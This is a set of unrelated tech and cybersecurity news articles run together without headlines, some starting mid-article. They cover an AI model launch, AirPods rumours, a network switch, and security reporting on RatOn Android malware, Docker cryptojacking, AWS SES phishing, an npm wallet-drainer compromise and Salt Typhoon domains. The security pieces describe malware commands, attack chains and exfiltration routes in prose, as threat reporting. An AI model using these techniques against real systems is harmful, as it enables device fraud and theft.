In addition, K2 Think will soon be available on Cerebras‘ wafer-scale, inference-optimized compute platform, enabling researchers and innovators worldwide to push the boundaries of reasoning performance at lightning-fast speed. With speculative decoding optimized for Cerebras hardware, K2 Think will achieve unprecedented throughput of 2000 tokens per second, making it both one of the fastest and most efficient reasoning systems in existence.
K2 Think ranks among the industry’s top reasoning systems, leading all open-source models in math performance across AIME ’24/’25, HMMT ’25, and OMNI-Math-HARD.
More than a technical achievement, K2 Think is a defining moment for AI in the UAE. It reflects how open innovation and close public–private partnerships can position Abu Dhabi as a global leader in AI, demonstrating that the future of reasoning will be shaped not only by size, but by ingenuity and collaboration.
His Excellency Khaldoon Khalifa Al Mubarak, Chairman of MBZUAI’s Board of Trustees and Member of the Artificial Intelligence and Advanced Technology Council (AIATC), said: “The new global benchmark set by K2 Think underscores the pioneering excellence of MBZUAI’s Institute of Foundation Models initiative, an expedited pathway for global collaboration and cutting-edge research. It is also an example of the UAE’s commitment to building advanced systems that are developed by our institutions and shared with the world – ultimately progressing technically groundbreaking, practical, and scalable innovations with transformative global impact.”
Peng Xiao, MBZUAI Board Member, Council Member of Abu Dhabi’s AI and Advanced Technology Council, and Group CEO of G42, added: “K2 Think has shifted the AI reasoning paradigm from ‘bigger is better’ to ‘smarter is better’. MBZUAI, supported by the UAE ecosystem, is pushing the AI frontier with technology that is open, efficient and highly capable. By proving that smaller, more resourceful models can rival the largest reasoning systems, this milestone marks the beginning of the next wave of AI innovation.”
Unlike most “open” AI models that stop at releasing weights, K2 Think is fully open source — from training data and parameter weights to software code for deployment and test-time optimization. This new level of transparency ensures that every step of how the model learns to reason can be studied, reproduced, and extended by the global research community.
Professor Eric Xing, MBZUAI President and University Professor, said: “K2 Think, developed by MBZUAI’s Institute of Foundation Models, is a significant advancement for the global AI research and development community. By delivering these advances in a fully transparent framework, we are ushering in a new era of cost-effective, reproducible and accountable AI. For an institution just five years young, we are immensely proud of our global researchers, engineers, and teams who are advancing science and technology with ingenuity and a pioneering spirit.”
K2 Think builds on a growing family of UAE-developed open-source models, including Jais (the world’s most advanced Arabic LLM), NANDA (Hindi), and SHERKALA (Kazakh), and extends the pioneering legacy of K2-65B, the world’s first fully reproducible open-source foundation model released in 2024.
K2 Think is available today at https://www.k2think.ai.

The standard AirPods and the AirPods Max will see a refresh in 2024, while the AirPods Pro will be updated in 2025. For the AirPods and ‌AirPods Pro‌, Apple will update the design of the earbuds and the case, while also improving audio quality.
When the AirPods are refreshed, Apple will phase out the second-generation and third-generation models, offering two fourth-generation models at different price points instead.
Both of the fourth-generation AirPods models will look like a cross between the current AirPods and the ‌AirPods Pro‌, with Apple introducing shorter stems. The higher-end version of the standard AirPods will feature Active Noise Cancellation, a feature that has thus far been limited to the ‌AirPods Pro‌ and the ‌AirPods Max‌.
Fit will be ""improved,"" but it is unclear if Apple plans to add silicone ear tips. As for the case, it will gain speakers for Find My alerts, similar to the current ‌AirPods Pro‌, and a USB-C charging port.
The ‌AirPods Max‌ will see the inclusion of a USB-C port for charging purposes instead of a Lightning port, and Apple will also debut new colors. No other notable features are expected at this time.
In 2025, the ‌AirPods Pro‌ will be updated with a new design and a faster chip, plus the earbuds could get some previously-rumored hearing health features. Rumors have suggested Apple is working on functionality that would let the ‌AirPods Pro‌ collect hearing data and better serve as a hearing aid replacement.
There is no clear word yet on when in 2024 and 2025 we might see AirPod refreshes, but Apple typically introduces new models in the latter half of the year around when new iPhones come out. Gurman says that the AirPods will come out ""later next year"" and the ‌AirPods Max‌ will come out ""around the end of next year.""

All signs point towards Apple unveiling the AirPods Pro 3 during its iPhone 17 event on Tuesday, September 9. However, Kuo did not provide a specific timeframe beyond the second half of 2025, which lines up with previous rumors.
Kuo did not mention any new features that are planned for the AirPods Pro 3. However, Bloomberg's Mark Gurman recently reported that the AirPods Pro 3 will likely have the same heart rate monitoring feature that Apple introduced on the Powerbeats Pro 2 earlier this year, along with a significantly smaller charging case.
When both Powerbeats Pro 2 earbuds are placed in the ears, and heart rate monitoring is active, Apple says LED optical sensors pulse at over 100 times per second to measure heart rate via blood flow. The feature integrates with popular fitness apps to collect data during workouts and sync it to Apple's Health app on the iPhone.
The feature is based on the Apple Watch's heart rate sensing technology. If someone is wearing both Powerbeats Pro 2 and an Apple Watch, Apple says apps default to using Apple Watch heart rate data, and that will likely apply to the AirPods Pro 3 too.
Beyond heart rate monitoring, it is likely that the next AirPods Pro will feature improved sound quality, increased active noise cancellation, design changes, and more.
AirPods Pro 2 debuted at the iPhone 14 event in September 2022, and they were updated with a USB-C charging case and a few other tweaks in September 2023.
Interestingly, Kuo said that Apple plans to update the AirPods Pro again next year, with a ""more significant"" hardware upgrade in the form at least one tiny infrared camera. A   leaker on Chinese platform Weibo subsequently claimed that these will be a higher-end version of the AirPods Pro 3, rather than AirPods Pro 4. That would make sense, given the long three-year gap between the first, second, and third AirPods Pro generations.
Kuo previously said AirPods with infrared cameras could be controlled with in-air gestures, and provide an enhanced spatial audio experience with Apple's Vision Pro headset.
""For example, when a user is watching a video with Vision Pro and wearing this new AirPods, if users turn their heads to look in a specific direction, the sound source in that direction can be emphasized to enhance the spatial audio/computing experience,"" he said.

Engineered to transform the Ethernet switch for high-performance computing (HPC) and AI workloads, Tomahawk Ultra delivers industry-leading ultra-low latency, massive throughput, and lossless networking.
“Tomahawk Ultra is a testament to innovation, involving a multi-year effort by hundreds of engineers who reimagined every aspect of the Ethernet switch,” said Ram Velaga, senior vice president and general manager of Broadcom’s Core Switching Group. “This highlights Broadcom’s commitment to invest in advancing Ethernet for high-performance networking and AI scale-up.”
Shattering Myths, Redefining Performance
Built from the ground up to meet the extreme demands of HPC environments and tightly coupled AI clusters, Tomahawk Ultra redefines what an Ethernet switch can deliver. Long perceived as higher-latency and lossy, Ethernet takes on a new role:

Ultra-low latency: Achieves 250ns switch latency at full 51.2 Tbps throughput.
High performance: Delivers line-rate switching performance even at minimum packet sizes of 64 bytes, supporting up to 77 billion packets per second.
Adaptable, optimized Ethernet headers: Reduces header overhead from 46 bytes down to as low as 10 bytes, while maintaining full Ethernet compliance —boosting network efficiency and enabling flexible, application-specific optimizations.
Lossless fabric: Implements Link Layer Retry (LLR) and Credit-Based Flow Control (CBFC) to eliminate packet loss and ensure reliability.

“AI and HPC workloads are converging into tightly coupled accelerator clusters that demand supercomputer-class latency — critical for inference, reliability, and in-network intelligence from the fabric itself,” said Kunjan Sobhani, lead semiconductor analyst, Bloomberg Intelligence. “Demonstrating that open-standards Ethernet can now deliver sub-microsecond switching, lossless transport, and on-chip collectives marks a pivotal step toward meeting those demands of an AI scale-up stack — projected to be double digit billions in a few years.”
Built for HPC and AI Scale-Up
Tomahawk Ultra is optimized for the tightly coupled, low-latency communication patterns found in both high-performance computing systems and AI clusters. With ultra-low latency switching and adaptable optimized Ethernet headers, it provides predictable, high-efficiency performance for large-scale simulations, scientific computing, and synchronized AI model training and inference.
When deployed with Scale-Up Ethernet (SUE specification available to the public here), Tomahawk Ultra enables sub-400ns XPU-to-XPU communication latency, including the switch transit time — setting a new benchmark for tightly synchronized AI compute at scale.
By reducing Ethernet header overhead from 46 bytes to just 10 bytes, while maintaining full Ethernet compliance, Tomahawk Ultra dramatically improves network efficiency. This optimized header is adaptable per application, offering both flexibility and performance gains across diverse HPC and AI workloads.
Tomahawk Ultra incorporates lossless fabric technology that eliminates packet drops during high-volume data transfer. Incorporating LLR, the switch detects link errors using Forward Error Correction and automatically retransmits packets, avoiding drops at the wire level. Simultaneously, CBFC prevents buffer overflows that traditionally caused packet loss. Together, these mechanisms create a truly lossless Ethernet fabric, delivering the level of reliability demanded by today’s most data-intensive workloads.
Tomahawk Ultra also accelerates performance through In-Network Collectives solving one of the most persistent bottlenecks in AI and machine learning workloads. Rather than burdening XPUs with collective operations like AllReduce, Broadcast, or AllGather, Tomahawk Ultra executes these directly within the switch chip. This can reduce job completion time and improve utilization of expensive compute resources. Importantly, this capability is endpoint-agnostic, enabling immediate adoption across a wide range of system architectures and vendor ecosystems.
Designed with innovations in topology-aware routing to support advanced HPC topologies including Dragonfly, Mesh and Torus, Tomahawk Ultra is also compliant with the UEC standard and embraces the openness and rich ecosystem of Ethernet networking.
Introducing SUE-Lite
As part of Broadcom’s Ethernet-forward strategy for AI scale-up, the company has introduced SUE-Lite — an optimized version of the SUE specification tailored for power and area-sensitive accelerator applications. SUE-Lite retains the key low-latency and lossless characteristics of full SUE, while further reducing the silicon footprint and power consumption of Ethernet interfaces on AI XPUs and CPUs.
This lightweight variant enables easier integration of standards-compliant Ethernet fabrics in AI platforms, promoting broader adoption of Ethernet as the interconnect of choice in scale-up architectures.
Platform for AI Scale-Up and HPC Scale-Out
Together with the 102.4 Tbps Tomahawk 6, Tomahawk Ultra forms the foundation of a unified Ethernet architecture: enabling scale-up Ethernet for AI, and scale-out Ethernet for HPC and distributed workloads.
Now Shipping
Tomahawk Ultra is 100% pin-compatible with Tomahawk 5, ensuring a very fast time-to-market. It is shipping now for deployment in rack-scale AI training clusters and supercomputing environments.

A new Android malware called RatOn has evolved from a basic tool capable of conducting Near Field Communication (NFC) relay attacks to a sophisticated remote access trojan with Automated Transfer System (ATS) capabilities to conduct device fraud.
""RatOn merges traditional overlay attacks with automatic money transfers and NFC relay functionality – making it a uniquely powerful threat,"" the Dutch mobile security company said in a report published today.
The banking trojan comes fitted with account takeover functions targeting cryptocurrency wallet applications like MetaMask, Trust, Blockchain.com, and Phantom, while also capable of carrying out automated money transfers abusing George Česko, a bank application used in the Czech Republic.
Furthermore, it can perform ransomware-like attacks using custom overlay pages and device locking. It's worth noting that a variant of the HOOK Android trojan was also observed incorporating ransomware-style overlay screens to display extortion messages.
The first sample distributing RatOn was detected in the wild on July 5, 2025, with more artifacts discovered as recently as August 29, 2025, indicating active development work on the part of the operators.

RatOn has leveraged fake Play Store listing pages masquerading as an adult-friendly version of TikTok (TikTok 18+) to host malicious dropper apps that deliver the trojan. It's currently not clear how users are lured to these sites, but the activity has singled out Czech and Slovakian-speaking users.
Once the dropper app is installed, it requests permission from the user to install applications from third-party sources so as to bypass critical security measures imposed by Google to prevent abuse of Android's accessibility services.
The second-stage payload then proceeds to request device administration and accessibility services, as well as permissions to read/write contacts and manage system settings to realize its malicious functionality.
This includes granting itself additional permissions as required and downloading a third-stage malware, which is nothing but the NFSkate malware that can perform NFC relay attacks using a technique called Ghost Tap. The malware family was first documented in November 2024.
""The account takeover and automated transfer features have shown that the threat actor knows the internals of the targeted applications quite well,"" ThreatFabric said, describing the malware as built from scratch and sharing no code similarities with other Android banking malware.

That's not all. RatOn can also serve overlay screens that resemble a ransom note, claiming that users' phones have been locked for viewing and distributing child pornography and that they need to pay $200 in cryptocurrency to regain access in two hours.
It's suspected that the ransom notes are designed to induce a false sense of urgency and coerce the victim into opening the cryptocurrency apps, making the transaction immediately, and enabling the attackers to capture the device PIN code in the process.
""Upon corresponding command, RatOn can launch the targeted cryptocurrency wallet app, unlock it using stolen PIN code, click on interface elements which are related to security settings of the app, and on the final step, reveal secret phrases,"" ThreatFabric said, detailing its account takeover features.
The sensitive data is subsequently recorded by a keylogger component and exfiltrated to an external server under the control of the threat actors, who can then use the seed phrases to obtain unauthorized access to the victims' accounts and steal cryptocurrency assets.

Some notable commands that are processed by RatOn are listed below -

send_push, to send fake push notifications
screen_lock, to change the device lock screen timeout to a specified value
WhatsApp, to launch WhatsApp
app_inject, to change the list of targeted financial applications
update_device, to send a list of installed apps with device fingerprint
send_sms, to send a SMS message using accessibility services
Facebook, to launch Facebook
nfs, to download and run the NFSkate APK malware
transfer, perform ATS using George Česko
lock, to lock the device using device administration access
add_contact, to create a new contact using a specified name and phone number
record, to launch a screen casting session
display, to turn on/off screen casting

""The threat actor group initially targeted the Czech Republic, with Slovakia likely being the next country of focus,"" ThreatFabric said. ""The reason behind concentrating on a single banking application remains unclear. However, the fact that automated transfers require local banking account numbers suggests that the threat actors may be collaborating with local money mules.""

It's budget season. Once again, security is being questioned, scrutinized, or deprioritized.
If you're a CISO or security leader, you've likely found yourself explaining why your program matters, why a given tool or headcount is essential, and how the next breach is one blind spot away. But these arguments often fall short unless they're framed in a way the board can understand and appreciate.
According to a Gartner analysis, 88% of Boards see cybersecurity as a business risk, rather than an IT issue, yet many security leaders still struggle to raise the profile of cybersecurity within the organization. For security issues to resonate amongst the Board you need to speak its language: business continuity, compliance, and cost impact. 
Below are some strategies to help you frame the conversation, transforming the technical and complex into clear business directives. 
Recognize the High Stakes
Cyber threats continue to evolve, from ransomware and supply chain attacks to advanced persistent threats. Both large enterprises and mid-sized organizations are targets. The business impact of a breach is significant. It disrupts operations, damages reputation, and incurs substantial penalties. To avoid this, organizations must adopt a proactive approach like continuous threat exposure management. Ongoing validation through frequent, automated testing helps identify new attack vectors before they escalate.
Align Security Strategy with Business Objectives
The board doesn't approve security budgets based on fear or uncertainty. They want to see how your strategy protects revenue, maintains uptime, and supports compliance. That means translating technical goals into outcomes that align with business initiatives. Define measurable KPIs like time to detect or remediate, and position your roadmap alongside upcoming projects like new system rollouts or merges and acquisitions.
Build a Risk-Focused Framework
When you ask for more budget, you need to show prioritization. That starts by identifying and categorizing your core assets, customer data, proprietary systems, and infrastructure. Where possible, quantify what a breach could cost the business. This helps define acceptable risk thresholds and guides investment. 
One of our customers, a US-based insurance provider, estimated that a breach of its policyholder database, which held a lot of customer PII, could cost the business more than $5 million in regulatory fines and lost revenue. This projection helped them prioritize vulnerabilities that could lead to this asset and validate its surrounding security controls. By focusing security efforts on high-value assets, they strengthened their security where it mattered most, and could show the board exactly why the investment was justified.
Use Industry Standards to Strengthen Your Case
Regulations and frameworks like ISO 27001, NIST, HIPAA, and PCI DSS are useful allies in making your case. They provide a baseline for good security hygiene and give leadership something familiar to anchor their decisions. But compliance doesn't guarantee security. Use audit feedback to highlight gaps and demonstrate how validation adds a layer of real-world protection.
Jay Martin, CISO of COFCO International, shared in a recent Pentera-hosted panel that ""we used to build budget requests around best practices, but what worked was showing where we were exposed—and how fast we could fix it.""

Craft a Business Case That Stands Up in the Boardroom
Security ROI is not just about cost savings. It is about avoiding losses, breaches, downtime, legal penalties, and brand damage. Automated security validation shows early wins by uncovering exposures that traditional tools miss. These include misconfigurations, excessive permissions, and leaked credentials that are proven to be exploitable in your environment. This proves the likelihood of an attack before it actually happens. This kind of evidence shows exactly where risk exists and how fast it can be fixed. It gives leadership a clear reason to expand the program and positions security as a business enabler, not just a cost center.
Communicate with the Right Message for Each Audience
Boards want to understand how security decisions impact the business, whether that's protecting revenue, avoiding regulatory penalties, or reducing the financial fallout of a breach. Security teams need operational details. Bridging that gap is part of your role. Tailor your message for each group and use real examples where possible. Share stories of how organizations in similar industries were impacted by missteps or succeeded thanks to proactive investment. Show how your plan creates alignment across departments and builds a culture of shared accountability.
Stay Ahead of Emerging Threats with Real Testing
Cyberattacks evolve quickly. Threats that did not exist last quarter might be your biggest risk today. That is why security validation needs to be an ongoing practice. Attackers are not waiting for your quarterly review cycle, and your defenses should not either. Frequent automated penetration tests, helps uncover blind spots across infrastructure, cloud environments, and partner systems.
Continuous testing also allows you to show your board exactly how prepared you are for current threats, especially the high-profile ones that dominate headlines. Tracking how your organization holds up against these threats over time gives you a clear way to demonstrate progress. This level of transparency builds confidence and helps shift the conversation from fear and uncertainty to readiness and measurable improvement.
Avoid Budget Waste
Too many security investments turn into shelfware, not because the tools are bad, but because they're underused, poorly integrated, or lack clear ownership. Make sure each solution maps to a specific need. Budget not only for licenses, but also for training and operational support. Regular tool audits can help you streamline efforts, reduce redundancy, and focus spending where it delivers the most value.
Finalize a Scalable, Defensible Budget Plan
The strongest budget plans break down spending by category: prevention, detection, response, and validation, and show how each area contributes to the larger picture.
Show how your plan scales with the business so every decision continues to deliver value. To support expanding into new regions, a global manufacturing enterprise used automated security validation to establish best practices for hardening assets and configuring security controls. Because they included continuous validation from the start, they avoided the high cost of manual testing and the operational strain of allocating extra resources. Most importantly, they maintained a strong security posture throughout their expansion by uncovering and remediating real exposures before attackers could exploit them.
Takeaways: Prove Security's Business Value
Security is no longer a cost center, it's a growth enabler. When you continuously validate your controls, you shift the conversation from assumptions to evidence. That evidence is what boards want to see.
Use standards to your advantage. Show that you're not just meeting expectations but actively reducing risk. And above all, keep making the case that smart, ongoing investment in cybersecurity protects the business today and builds resilience for tomorrow.
To move beyond one-time audits and annual reviews, check out our GOAT guide on how to communicate risk to the Board. It shows you how to use continuous validation, to not just defend your organization, but prove your security strategy is working.

Cybersecurity researchers have discovered a variant of a recently disclosed campaign that abuses the TOR network for cryptojacking attacks targeting exposed Docker APIs.
Akamai, which discovered the latest activity last month, said it's designed to block other actors from accessing the Docker API from the internet.
The findings build on a prior report from Trend Micro in late June 2025, which uncovered a malicious campaign that targeted exposed Docker instances to stealthily drop an XMRig cryptocurrency miner using a TOR domain for anonymity.
""This new strain seems to use similar tooling to the original, but may have a different end goal – including possibly setting up the foundation of a complex botnet,"" security researcher Yonatan Gilvarg said.
The attack chain essentially involves breaking into misconfigured Docker APIs to execute a new container based on the Alpine Docker image and mount the host file system into it. This is followed by the threat actors running a Base64-encoded payload to download a shell script downloader from a .onion domain.

The script, besides altering SSH configurations to set up persistence, also installs other tools such as masscan, libpcap, libpcap-dev, zstd, and torsocks to conduct reconnaissance, contact a command-and-control (C2) server, and download a compressed binary from a second .onion domain.
""The first file that is downloaded is a dropper written in Go that includes the content it wants to drop, so it won't communicate out to the internet,"" Gilvarg explained. ""Except for dropping another binary file, it parses the utmp file to find who is currently logged in to the machine.""
Interestingly, the binary file's source code includes an emoji to depict users who are signed in to the system. This indicates that the artifact may have been crafted using a large language model (LLM).
The dropper also launches Masscan to scan the internet for open Docker API services at port 2375 and propagate the infection to those machines by repeating the same process of creating a container with the Base64 command.
Furthermore, the binary includes checks for two more ports: 23 (Telnet) and 9222 (remote debugging port for Chromium browsers), although the functionality to spread via those ports is yet to be fully fleshed out.
The Telnet attack method entails using a set of known, default routers and device credentials to brute-force logins and exfiltrate successful sign-in attempts to a webhook[.]site endpoint with details about the destination IP address and victim authentication credentials.

In the case of port 9222, the malware utilizes a Go library named chromedp to interact with the web browser. It has been previously weaponized by North Korean threat actors to communicate with C2 servers and even by stealer malware to bypass Chrome's app-bound encryption, connect remotely to Chromium sessions, and siphon cookies and other private data.
It then proceeds to attach to an existing session with the open remote port and ultimately send a POST to the same .onion domain used to retrieve the shell script downloader with information about the source IP address on which the malware is and the destination it found access to on port 9222.
The details are transmitted to an endpoint named ""httpbot/add,"" raising the possibility that devices with exposed remote debugging ports for Chrome/Chromium could be enlisted into a botnet for delivering additional payloads that can steal data or be used to conduct distributed denial-of-service (DDoS) attacks.
""As the malware only scans for port 2375, the logic for handling ports 23 and 9222 is currently unreachable and will not be executed,"" Gilvarg said. ""However, the implementation exists, which may indicate future capabilities.""
""Attackers can gain significant control over systems affected by abused APIs. The importance of segmenting networks, limiting exposure of services to the internet, and securing default credentials cannot be overstated. By adopting these measures, organizations can significantly reduce their vulnerability to such threats.""
Wiz Flags AWS SES Abuse Campaign
The disclosure comes as cloud security firm Wiz detailed an Amazon Simple Email Service (SES) campaign in May 2025 that leveraged compromised Amazon Web Services (AWS) access keys as a launchpad for a mass phishing attack.

It's currently not known how the keys were obtained. However, various methods exist by which an attacker can accomplish this: accidental public exposure in code repositories or through misconfigured assets, or theft from a developer workstation using stealer malware.

""The attacker used the compromised key to access the victim's AWS environment, bypass SES's built-in restrictions, verify new 'sender' identities, and methodically prepare and conduct a phishing operation,"" Wiz researchers Itay Harel and Hila Ramati said.

Wiz, which further probed the phishing campaign in partnership with Proofpoint, said the emails targeted several organizations spanning multiple geographies and sectors, and employed tax-themed lures to redirect recipients to credential harvesting pages.
""If SES is configured in your account, attackers can send email from your verified domains,"" Wiz cautioned. ""Beyond brand damage, this enables phishing that looks like it came from you and can be used for spearphishing, fraud, data theft, or masquerading in business processes.""

Multiple npm packages have been compromised as part of a software supply chain attack after a maintainer's account was compromised in a phishing attack.

The attack targeted Josh Junon (aka Qix), who received an email message that mimicked npm (""support@npmjs[.]help""), urging them to update their update their two-factor authentication (2FA) credentials before September 10, 2025, by clicking on embedded link.

The phishing page is said to have prompted the co-maintainer to enter their username, password, and two-factor authentication (2FA) token, only for it to be stolen likely by means of an adversary-in-the-middle (AitM) attack and used to publish the rogue version to the npm registry.

The following 20 packages, which collectively attract over 2 billion weekly downloads, have been confirmed as affected as part of the incident -

ansi-styles@6.2.2

backslash@0.2.1

slice-ansi@7.1.1

strip-ansi@7.1.1

supports-color@10.2.1

wrap-ansi@9.0.1



""Sorry everyone, I should have paid more attention,"" Junon said in a post on Bluesky. ""Not like me; have had a stressful week. Will work to get this cleaned up.""

An analysis of the obfuscated malware injected into the source code reveals that it's designed to intercept cryptocurrency transaction requests and swap the destination wallet address with an attacker-controlled wallet that closely matches it by computing the Levenshtein distance.

According to Aikido Security's Charlie Eriksen, the payload acts as a browser-based interceptor that hijacks network traffic and application APIs to steal cryptocurrency assets by rewriting requests and responses. It's currently not known who is behind the attack.

""The payload begins by checking typeof window !== 'undefined' to confirm it is running in a browser,"" Socket said. ""It then hooks into window.fetch, XMLHttpRequest, and window.ethereum.request, along with other wallet provider APIs.""

""This means the malware targets end users with connected wallets who visit a site that includes the compromised code. Developers are not inherently the target, but if they open an affected site in a browser and connect a wallet, they too become victims.""

Package ecosystems like npm and the Python Package Index (PyPI) remain recurring targets due to their popularity and broad reach within the developer community, with attackers abusing the trust associated with these platforms to push malicious payloads. 

Beyond publishing malicious packages directly, attackers have also employed techniques such as typosquatting or even exploiting AI-hallucinated dependencies – called slopsquatting – to trick developers into installing malware. The incident once indicates the need for exercising vigilance and hardening CI/CD pipelines and locking down dependencies.

According to ReversingLabs' 2025 Software Supply Chain Security Report, 14 of the 23 crypto-related malicious campaigns in 2024 targeted npm, with the remainder linked to PyPI.

""What we are seeing unfold with the npm packages chalk and debug is an unfortunately common instance today in the software supply chain,"" Ilkka Turunen, Field CTO at Sonatype, told The Hacker News.

""The malicious payload was focused on crypto theft, but this takeover follows a classic attack that is now established – by taking over popular open source packages, adversaries can steal secrets, leave behind backdoors and infiltrate organizations.""

""It was not a random choice to target the developer of these packages. Package takeovers are now a standard tactic for advanced persistent threat groups like Lazarus, because they know they can reach a large amount of the world's developer population by infiltrating a single under-resourced project.""

Supply Chain Attack Broadens 
According to Socket and Sonatype, the npm supply chain attack that compromised Qix has also managed to claim another high-profile maintainer, duckdb_admin, to distribute the same wallet-drainer malware. The list of affected packages is below -

@coveops/abi@2.0.1
@duckdb/duckdb-wasm@1.29.2
@duckdb/node-api@1.3.3
@duckdb/node-bindings@1.3.3

Threat hunters have discovered a set of previously unreported domains, some going back to May 2020, that are associated with China-linked threat actors Salt Typhoon and UNC4841.
""The domains date back several years, with the oldest registration activity occurring in May 2020, further confirming that the 2024 Salt Typhoon attacks were not the first activity carried out by this group,"" Silent Push said in a new analysis shared with The Hacker News.
The identified infrastructure, totaling 45 domains, has also been identified as sharing some level of overlap with another China-associated hacking group tracked as UNC4841, which is best known for its zero-day exploitation of a security flaw in Barracuda Email Security Gateway (ESG) appliances (CVE-2023-2868, CVSS score: 9.8).
Salt Typhoon, active since 2019, drew widespread attention last year for its targeting of telecommunications services providers in the U.S. Believed to be operated by China's Ministry of State Security (MSS), the threat cluster shares similarities with activities tracked as Earth Estries, FamousSparrow, GhostEmperor, and UNC5807.

Silent Push said it identified three Proton Mail email addresses that were used to register as many as 16 domains with non-existent addresses.
Further examination of the IP addresses related to the 45 domains has revealed that many of these domains pointed to high-density IP addresses. These refer to IP addresses to which a high number of hostnames currently point, or have pointed in the past. Of those that pointed to low-density IP addresses, the earliest activity goes back to October 2021.
The oldest domain identified as being part of China-backed cyber espionage campaigns is onlineeylity[.]com, registered on May 19, 2020, by a fake persona named Monica Burch, who claims to reside at 1294 Koontz Lane in Los Angeles, California.
""As such, we strongly urge any organization that believes itself to be at risk of Chinese espionage to search its DNS logs for the past five years for requests to any of the domains in our archive feed, or their subdomains,"" Silent Push said.
""It would also be prudent to check for requests to any of the listed IP addresses, particularly during the time periods in which this actor operated them.""
